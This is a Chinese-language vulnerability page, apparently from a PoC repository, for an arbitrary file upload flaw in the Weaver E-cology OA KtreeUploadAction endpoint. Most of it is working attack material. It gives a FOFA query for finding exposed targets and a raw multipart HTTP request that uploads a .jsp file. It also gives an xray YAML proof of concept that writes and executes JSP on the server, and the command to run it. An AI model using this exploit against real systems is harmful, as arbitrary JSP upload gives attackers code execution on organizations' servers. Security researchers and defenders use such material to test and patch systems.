# 泛微OA E-cology KtreeUploadAction 任意文件上传漏洞
## 漏洞描述

泛微OA E-cology KtreeUploadAction 存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器敏感信息。
## 影响版本
```
泛微OA E-cology
```

## 网络测绘
```
app="泛微-协同办公OA"
```

## 环境搭建

-
## 漏洞复现

![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309201614787.png)

![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309201614551.png)


## 数据包
```
POST /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: Secure; JSESSIONID=abc6xLBV7S2jvgm3CB50w; Secure; testBanCookie=test
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=--------1638451160
Content-Length: 171

----------1638451160
Content-Disposition: form-data; name="test"; filename="test.jsp"
Content-Type: image/jpeg

helloword
----------1638451160--

```

## YAML代码
```
name: poc-yaml-ecology-ktreeuploadaction-upload
manual: true
transport: http
set:
  s1: randomInt(40000, 44800)
  s2: randomInt(40000, 44800)
  rboundary: randomLowercase(8)
  randname: randomLowercase(6)
rules:
  r0:
    request:
      cache: true
      method: POST
      path: /weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction?action=image
      headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
      body: "------WebKitFormBoundary{{rboundary}}\r\nContent-Disposition: form-data; name=\"test\"; filename=\"{{randname}}.jsp\"\r\nContent-Type: image/jpeg\r\n\r\n<%out.print({{s1}} * {{s2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n------WebKitFormBoundary{{rboundary}}--\r\n"
    expression: response.status == 200 && response.body.bcontains(b"SUCCESS")
    output:
      search: |
        ",'url':'/(?P<furl>.*?.jsp)',".bsubmatch(response.body)
      furl: search["furl"]
  r1:
    request:
      cache: true
      method: GET
      path: /{{furl}}
    expression: response.status == 200 && response.body.bcontains(bytes(string(s1 * s2)))

expression: r0() && r1()
# expression: r1() 
detail:
  author: klear
  links:
    - https://github.com/WingsSec/Meppo/blob/139819ec08bc0312a69c751aa99e87f218d8be8b/Moudle/Weaver/Weaver_e_cology_KtreeUploadAction.py#L12


```

## xray调用

```
xray ws --poc poc-yaml-ecology-KtreeUploadAction-upload.yml --url xx.xx.xx.xx
```

![image.png](https://cdn.jsdelivr.net/gh/klearcc/pic/img202309201615107.png)
